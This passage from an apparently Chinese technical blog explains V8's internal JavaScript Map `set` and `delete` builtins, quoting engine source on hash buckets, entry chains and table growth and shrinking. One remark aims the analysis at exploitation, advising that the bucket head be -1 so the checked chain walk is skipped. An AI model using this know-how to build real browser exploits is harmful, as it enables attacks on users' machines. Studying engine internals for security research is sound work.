class="built_in">Int32Constant</span>(<span class="number">0x3FFFFFFF</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> CollectionType&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CollectionsBuiltinsAssembler::FindOrderedHashTableEntryForSmiKey</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    TNode&lt;CollectionType&gt; table, TNode&lt;Smi&gt; smi_key, TVariable&lt;IntPtrT&gt;* result,</span></span></span><br><span class="line"><span class="params"><span class="function">    Label* entry_found, Label* not_found)</span> </span>&#123;</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; key_untagged = <span class="built_in">SmiUntag</span>(smi_key);</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; hash =</span><br><span class="line">      <span class="built_in">ChangeInt32ToIntPtr</span>(<span class="built_in">ComputeUnseededHash</span>(key_untagged));</span><br><span class="line">  <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">IntPtrGreaterThanOrEqual</span>(hash, <span class="built_in">IntPtrConstant</span>(<span class="number">0</span>)));</span><br><span class="line">  *result = hash;</span><br><span class="line">  <span class="built_in">FindOrderedHashTableEntry</span>&lt;CollectionType&gt;(</span><br><span class="line">      table, hash,</span><br><span class="line">      [&amp;](TNode&lt;Object&gt; other_key, Label* if_same, Label* if_not_same) &#123;</span><br><span class="line">        <span class="built_in">SameValueZeroSmi</span>(smi_key, other_key, if_same, if_not_same);</span><br><span class="line">      &#125;,</span><br><span class="line">      result, entry_found, not_found);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> CollectionType&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CollectionsBuiltinsAssembler::TryLookupOrderedHashTableIndex</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> TNode&lt;CollectionType&gt; table, <span class="type">const</span> TNode&lt;Object&gt; key,</span></span></span><br><span class="line"><span class="params"><span class="function">    TVariable&lt;IntPtrT&gt;* result, Label* if_entry_found, Label* if_not_found)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">BIND</span>(&amp;if_key_smi);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">FindOrderedHashTableEntryForSmiKey</span>&lt;CollectionType&gt;(</span><br><span class="line">        table, <span class="built_in">CAST</span>(key), result, if_entry_found, if_not_found);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">TryLookupOrderedHashTableIndex</span>&lt;OrderedHashMap&gt;(</span><br><span class="line">      table, key, &amp;entry_start_position_or_hash, &amp;entry_found, &amp;not_found);</span><br></pre></td></tr></table></figure></div>

<p><code>FindOrderedHashTableEntry</code> 函数接口如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> CollectionType&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CollectionsBuiltinsAssembler::FindOrderedHashTableEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> TNode&lt;CollectionType&gt; table, <span class="type">const</span> TNode&lt;IntPtrT&gt; hash,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> std::function&lt;<span class="type">void</span>(TNode&lt;Object&gt;, Label*, Label*)&gt;&amp; key_compare,</span></span></span><br><span class="line"><span class="params"><span class="function">    TVariable&lt;IntPtrT&gt;* entry_start_position, Label* entry_found,</span></span></span><br><span class="line"><span class="params"><span class="function">    Label* not_found)</span></span></span><br></pre></td></tr></table></figure></div>

<p>在 <code>FindOrderedHashTableEntry</code> 首先计算出 <code>Key</code> 对应 <code>HashTable</code> 中的下标，这里是将前面计算出的 <code>key</code> 的哈希值与上 <code>number_of_buckets</code>，即 <code>ComputeUnseededHash(key) &amp; (buckets - 1)</code> 。最后的 <code>first_entry</code> 为 <code>HashTable</code> 该位置上的值。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> TNode&lt;IntPtrT&gt; number_of_buckets =</span><br><span class="line">    <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">        table, CollectionType::<span class="built_in">NumberOfBucketsIndex</span>())));</span><br><span class="line"><span class="type">const</span> TNode&lt;IntPtrT&gt; bucket =</span><br><span class="line">    <span class="built_in">WordAnd</span>(hash, <span class="built_in">IntPtrSub</span>(number_of_buckets, <span class="built_in">IntPtrConstant</span>(<span class="number">1</span>)));</span><br><span class="line"><span class="type">const</span> TNode&lt;IntPtrT&gt; first_entry = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">    table, bucket, CollectionType::<span class="built_in">HashTableStartIndex</span>() * kTaggedSize)));</span><br></pre></td></tr></table></figure></div>

<p>之后循环遍历链表，直到找到 <code>key</code> 对应的 <code>entry</code> 或者找到 <code>CollectionType::kNotFound</code> 。</p>
<p><strong>这里注意到在遍历链表时有检查，因此在漏洞利用时应避免遍历链表的操作，即 <code>HashTable[ComputeUnseededHash(key) &amp; (buckets - 1)]</code> 应该为 -1 。</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Walk the bucket chain.</span></span><br><span class="line"> TNode&lt;IntPtrT&gt; entry_start;</span><br><span class="line"> <span class="function">Label <span class="title">if_key_found</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">TVARIABLE</span>(IntPtrT, var_entry, first_entry);</span><br><span class="line">   <span class="function">Label <span class="title">loop</span><span class="params">(<span class="keyword">this</span>, &#123;&amp;var_entry, entry_start_position&#125;)</span>,</span></span><br><span class="line"><span class="function">       <span class="title">continue_next_entry</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">   <span class="built_in">Goto</span>(&amp;loop);</span><br><span class="line">   <span class="built_in">BIND</span>(&amp;loop);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// If the entry index is the not-found sentinel, we are done.</span></span><br><span class="line">   <span class="built_in">GotoIf</span>(<span class="built_in">IntPtrEqual</span>(var_entry.<span class="built_in">value</span>(),</span><br><span class="line">                      <span class="built_in">IntPtrConstant</span>(CollectionType::kNotFound)),</span><br><span class="line">          not_found);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Make sure the entry index is within range.</span></span><br><span class="line">   <span class="built_in">CSA_ASSERT</span>(</span><br><span class="line">       <span class="keyword">this</span>,</span><br><span class="line">       <span class="built_in">UintPtrLessThan</span>(</span><br><span class="line">           var_entry.<span class="built_in">value</span>(),</span><br><span class="line">           <span class="built_in">SmiUntag</span>(<span class="built_in">SmiAdd</span>(</span><br><span class="line">               <span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">                   table, CollectionType::<span class="built_in">NumberOfElementsIndex</span>())),</span><br><span class="line">               <span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">                   table, CollectionType::<span class="built_in">NumberOfDeletedElementsIndex</span>()))))));</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Compute the index of the entry relative to kHashTableStartIndex.</span></span><br><span class="line">   entry_start =</span><br><span class="line">       <span class="built_in">IntPtrAdd</span>(<span class="built_in">IntPtrMul</span>(var_entry.<span class="built_in">value</span>(),</span><br><span class="line">                           <span class="built_in">IntPtrConstant</span>(CollectionType::kEntrySize)),</span><br><span class="line">                 number_of_buckets);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Load the key from the entry.</span></span><br><span class="line">   <span class="type">const</span> TNode&lt;Object&gt; candidate_key = <span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">       table, entry_start,</span><br><span class="line">       CollectionType::<span class="built_in">HashTableStartIndex</span>() * kTaggedSize);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">key_compare</span>(candidate_key, &amp;if_key_found, &amp;continue_next_entry);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">BIND</span>(&amp;continue_next_entry);</span><br><span class="line">   <span class="comment">// Load the index of the next entry in the bucket chain.</span></span><br><span class="line">   var_entry = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">       table, entry_start,</span><br><span class="line">       (CollectionType::<span class="built_in">HashTableStartIndex</span>() + CollectionType::kChainOffset) *</span><br><span class="line">           kTaggedSize)));</span><br><span class="line"></span><br><span class="line">   <span class="built_in">Goto</span>(&amp;loop);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">BIND</span>(&amp;if_key_found);</span><br><span class="line"> *entry_start_position = entry_start;</span><br><span class="line"> <span class="built_in">Goto</span>(entry_found);</span><br></pre></td></tr></table></figure></div>

<p>如果在 <code>Map</code> 中已经存在待加入的 <code>key</code> 了，则调用 <code>StoreFixedArrayElement</code> 更新 <code>Entry</code> 中的 <code>value</code> ，这里的 <code>entry_start_position_or_hash</code> 即前面 <code>TryLookupOrderedHashTableIndex</code> 找到的 <code>Entry</code> 在 <code>elements</code> 中的下标（实际上是相当于 <code>table</code> 的偏移）。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;entry_found);</span><br><span class="line"><span class="comment">// If we found the entry, we just store the value there.</span></span><br><span class="line"><span class="built_in">StoreFixedArrayElement</span>(table, entry_start_position_or_hash.<span class="built_in">value</span>(), value,</span><br><span class="line">                       UPDATE_WRITE_BARRIER,</span><br><span class="line">                       kTaggedSize * (OrderedHashMap::<span class="built_in">HashTableStartIndex</span>() +</span><br><span class="line">                                      OrderedHashMap::kValueOffset));</span><br><span class="line"><span class="built_in">Return</span>(receiver);</span><br></pre></td></tr></table></figure></div>

<p>之后特判了 <code>entry_start_position_or_hash</code> 不是 hash code 的情况（？？）</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Label <span class="title">no_hash</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">add_entry</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">store_new_entry</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"><span class="built_in">BIND</span>(&amp;not_found);</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// If we have a hash code, we can start adding the new entry.</span></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">IntPtrGreaterThan</span>(entry_start_position_or_hash.<span class="built_in">value</span>(),</span><br><span class="line">                           <span class="built_in">IntPtrConstant</span>(<span class="number">0</span>)),</span><br><span class="line">         &amp;add_entry);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Otherwise, go to runtime to compute the hash code.</span></span><br><span class="line">  entry_start_position_or_hash = <span class="built_in">SmiUntag</span>(<span class="built_in">CallGetOrCreateHashRaw</span>(<span class="built_in">CAST</span>(key)));</span><br><span class="line">  <span class="built_in">Goto</span>(&amp;add_entry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后判断是否满足 <code>elements + deletes &lt; buckets &lt;&lt; 1</code> ，如果不满足则增加 <code>Map</code> 的容量。这就是为什么调试的时候 <code>OrderedHashMap</code> 的位置一直在变。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;add_entry);</span><br><span class="line"><span class="built_in">TVARIABLE</span>(IntPtrT, number_of_buckets);</span><br><span class="line"><span class="built_in">TVARIABLE</span>(IntPtrT, occupancy);</span><br><span class="line"><span class="built_in">TVARIABLE</span>(OrderedHashMap, table_var, table);</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Check we have enough space for the entry.</span></span><br><span class="line">  number_of_buckets = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">      table, OrderedHashMap::<span class="built_in">NumberOfBucketsIndex</span>())));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">STATIC_ASSERT</span>(OrderedHashMap::kLoadFactor == <span class="number">2</span>);</span><br><span class="line">  <span class="type">const</span> TNode&lt;WordT&gt; capacity = <span class="built_in">WordShl</span>(number_of_buckets.<span class="built_in">value</span>(), <span class="number">1</span>);</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; number_of_elements = <span class="built_in">SmiUntag</span>(</span><br><span class="line">      <span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(table, OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>())));</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; number_of_deleted = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(</span><br><span class="line">      table, OrderedHashMap::<span class="built_in">NumberOfDeletedElementsOffset</span>())));</span><br><span class="line">  occupancy = <span class="built_in">IntPtrAdd</span>(number_of_elements, number_of_deleted);</span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">IntPtrLessThan</span>(occupancy.<span class="built_in">value</span>(), capacity), &amp;store_new_entry);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// We do not have enough space, grow the table and reload the relevant</span></span><br><span class="line">  <span class="comment">// fields.</span></span><br><span class="line">  <span class="built_in">CallRuntime</span>(Runtime::kMapGrow, context, receiver);</span><br><span class="line">  table_var =</span><br><span class="line">      <span class="built_in">LoadObjectField</span>&lt;OrderedHashMap&gt;(<span class="built_in">CAST</span>(receiver), JSMap::kTableOffset);</span><br><span class="line">  number_of_buckets = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">UnsafeLoadFixedArrayElement</span>(</span><br><span class="line">      table_var.<span class="built_in">value</span>(), OrderedHashMap::<span class="built_in">NumberOfBucketsIndex</span>())));</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; new_number_of_elements = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(</span><br><span class="line">      table_var.<span class="built_in">value</span>(), OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>())));</span><br><span class="line">  <span class="type">const</span> TNode&lt;IntPtrT&gt; new_number_of_deleted = <span class="built_in">SmiUntag</span>(<span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(</span><br><span class="line">      table_var.<span class="built_in">value</span>(), OrderedHashMap::<span class="built_in">NumberOfDeletedElementsOffset</span>())));</span><br><span class="line">  occupancy = <span class="built_in">IntPtrAdd</span>(new_number_of_elements, new_number_of_deleted);</span><br><span class="line">  <span class="built_in">Goto</span>(&amp;store_new_entry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后调用 <code>StoreOrderedHashMapNewEntry</code> 将新的 <code>Entry</code> 添加到 <code>elements</code> 中。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;store_new_entry);</span><br><span class="line"><span class="comment">// Store the key, value and connect the element to the bucket chain.</span></span><br><span class="line"><span class="built_in">StoreOrderedHashMapNewEntry</span>(table_var.<span class="built_in">value</span>(), key, value,</span><br><span class="line">                            entry_start_position_or_hash.<span class="built_in">value</span>(),</span><br><span class="line">                            number_of_buckets.<span class="built_in">value</span>(), occupancy.<span class="built_in">value</span>());</span><br><span class="line"><span class="built_in">Return</span>(receiver);</span><br></pre></td></tr></table></figure></div>

<p><code>StoreOrderedHashMapNewEntry</code> 的函数接口如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CollectionsBuiltinsAssembler::StoreOrderedHashMapNewEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> TNode&lt;OrderedHashMap&gt; table, <span class="type">const</span> TNode&lt;Object&gt; key,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> TNode&lt;Object&gt; value, <span class="type">const</span> TNode&lt;IntPtrT&gt; hash,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> TNode&lt;IntPtrT&gt; number_of_buckets, <span class="type">const</span> TNode&lt;IntPtrT&gt; occupancy)</span></span></span><br></pre></td></tr></table></figure></div>

<p>首先计算出将要添加的 <code>Entry</code> 的位置，这里获取的 <code>entry_start</code> 是相对于 <code>HashTable</code> 的偏移。 </p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> TNode&lt;IntPtrT&gt; entry_start = <span class="built_in">IntPtrAdd</span>(</span><br><span class="line">    <span class="built_in">IntPtrMul</span>(occupancy, <span class="built_in">IntPtrConstant</span>(OrderedHashMap::kEntrySize)),</span><br><span class="line">    number_of_buckets);</span><br></pre></td></tr></table></figure></div>

<p>之后依次写入 <code>key</code> ，<code>value</code> ，<code>bucket_entry</code> ，即整个 <code>Entry</code> 的结构。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">    table, entry_start, key, UPDATE_WRITE_BARRIER,</span><br><span class="line">    kTaggedSize * OrderedHashMap::<span class="built_in">HashTableStartIndex</span>());</span><br><span class="line"><span class="built_in">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">    table, entry_start, value, UPDATE_WRITE_BARRIER,</span><br><span class="line">    kTaggedSize * (OrderedHashMap::<span class="built_in">HashTableStartIndex</span>() +</span><br><span class="line">                   OrderedHashMap::kValueOffset));</span><br><span class="line"><span class="built_in">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">    table, entry_start, bucket_entry,</span><br><span class="line">    kTaggedSize * (OrderedHashMap::<span class="built_in">HashTableStartIndex</span>() +</span><br><span class="line">                   OrderedHashMap::kChainOffset));</span><br></pre></td></tr></table></figure></div>

<p>之后更新 <code>bucket</code> 和 <code>number of elements</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Update the bucket head.</span></span><br><span class="line"><span class="built_in">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">    table, bucket, <span class="built_in">SmiTag</span>(occupancy),</span><br><span class="line">    OrderedHashMap::<span class="built_in">HashTableStartIndex</span>() * kTaggedSize);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Bump the elements count.</span></span><br><span class="line"><span class="type">const</span> TNode&lt;Smi&gt; number_of_elements =</span><br><span class="line">    <span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(table, OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>()));</span><br><span class="line"><span class="built_in">StoreObjectFieldNoWriteBarrier</span>(table,</span><br><span class="line">                               OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>(),</span><br><span class="line">                               <span class="built_in">SmiAdd</span>(number_of_elements, <span class="built_in">SmiConstant</span>(<span class="number">1</span>)));</span><br></pre></td></tr></table></figure></div>



<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p><code>delete(key)</code> 是 <code>JSMap</code> 中用来删除键值对的方法，具体接口定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">TF_BUILTIN</span>(MapPrototypeDelete, CollectionsBuiltinsAssembler) </span><br></pre></td></tr></table></figure></div>

<p>首先 <code>TryLookupOrderedHashTableIndex</code> 查找 <code>key</code> 对应的 <code>Entry</code> ，这个的具体实现前面的 <code>set</code> 已经提到过了。 </p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">TryLookupOrderedHashTableIndex</span>&lt;OrderedHashMap&gt;(</span><br><span class="line">    table, key, &amp;entry_start_position_or_hash, &amp;entry_found, &amp;not_found);</span><br></pre></td></tr></table></figure></div>

<p>如果没有找到则返回 <code>False</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;not_found);</span><br><span class="line"><span class="built_in">Return</span>(<span class="built_in">FalseConstant</span>());</span><br></pre></td></tr></table></figure></div>

<p>如果找到了 <code>Entry</code> 就将 <code>Entry</code> 中的 <code>key</code> 和 <code>value</code> 修改为 <code>Hole</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BIND</span>(&amp;entry_found);</span><br><span class="line"><span class="comment">// If we found the entry, mark the entry as deleted.</span></span><br><span class="line"><span class="built_in">StoreFixedArrayElement</span>(table, entry_start_position_or_hash.<span class="built_in">value</span>(),</span><br><span class="line">                       <span class="built_in">TheHoleConstant</span>(), UPDATE_WRITE_BARRIER,</span><br><span class="line">                       kTaggedSize * OrderedHashMap::<span class="built_in">HashTableStartIndex</span>());</span><br><span class="line"><span class="built_in">StoreFixedArrayElement</span>(table, entry_start_position_or_hash.<span class="built_in">value</span>(),</span><br><span class="line">                       <span class="built_in">TheHoleConstant</span>(), UPDATE_WRITE_BARRIER,</span><br><span class="line">                       kTaggedSize * (OrderedHashMap::<span class="built_in">HashTableStartIndex</span>() +</span><br><span class="line">                                      OrderedHashMap::kValueOffset));</span><br></pre></td></tr></table></figure></div>

<p>之后将 <code>number_of_elements</code> 减一，<code>number_of_deleted</code> 加一。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Decrement the number of elements, increment the number of deleted elements.</span></span><br><span class="line"> <span class="type">const</span> TNode&lt;Smi&gt; number_of_elements = <span class="built_in">SmiSub</span>(</span><br><span class="line">     <span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(table, OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>())),</span><br><span class="line">     <span class="built_in">SmiConstant</span>(<span class="number">1</span>));</span><br><span class="line"> <span class="built_in">StoreObjectFieldNoWriteBarrier</span>(</span><br><span class="line">     table, OrderedHashMap::<span class="built_in">NumberOfElementsOffset</span>(), number_of_elements);</span><br><span class="line"> <span class="type">const</span> TNode&lt;Smi&gt; number_of_deleted =</span><br><span class="line">     <span class="built_in">SmiAdd</span>(<span class="built_in">CAST</span>(<span class="built_in">LoadObjectField</span>(</span><br><span class="line">                table, OrderedHashMap::<span class="built_in">NumberOfDeletedElementsOffset</span>())),</span><br><span class="line">            <span class="built_in">SmiConstant</span>(<span class="number">1</span>));</span><br><span class="line"> <span class="built_in">StoreObjectFieldNoWriteBarrier</span>(</span><br><span class="line">     table, OrderedHashMap::<span class="built_in">NumberOfDeletedElementsOffset</span>(),</span><br><span class="line">     number_of_deleted);</span><br></pre></td></tr></table></figure></div>

<p>之后判断是否满足 <code>number_of_elements + number_of_elements &lt; number_of_buckets</code> 则调用 <code>shrink</code> 将 <code>elements</code> 中的 <code>Hole</code> 清除。最后返回 <code>True</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> TNode&lt;Smi&gt; number_of_buckets = <span class="built_in">CAST</span>(</span><br><span class="line">    <span class="built_in">LoadFixedArrayElement</span>(table, OrderedHashMap::<span class="built_in">NumberOfBucketsIndex</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// If there fewer elements than #buckets / 2, shrink the table.</span></span><br><span class="line"><span class="function">Label <span class="title">shrink</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"><span class="built_in">GotoIf</span>(<span class="built_in">SmiLessThan</span>(<span class="built_in">SmiAdd</span>(number_of_elements, number_of_elements),</span><br><span class="line">                   number_of_buckets),</span><br><span class="line">       &amp;shrink);</span><br><span class="line"><span class="built_in">Return</span>(<span class="built_in">TrueConstant</span>());</span><br><span class="line"></span><br><span class="line"><span class="built_in">BIND</span>(&amp;shrink);</span><br><span class="line"><span class="built_in">CallRuntime</span>(Runtime::kMapShrink, context, receiver);</span><br><span class="line"><span class="built_in">Return</span>(<span class="built_in">TrueConstant</span>());</span><br></pre></td></tr></table></figure></div>
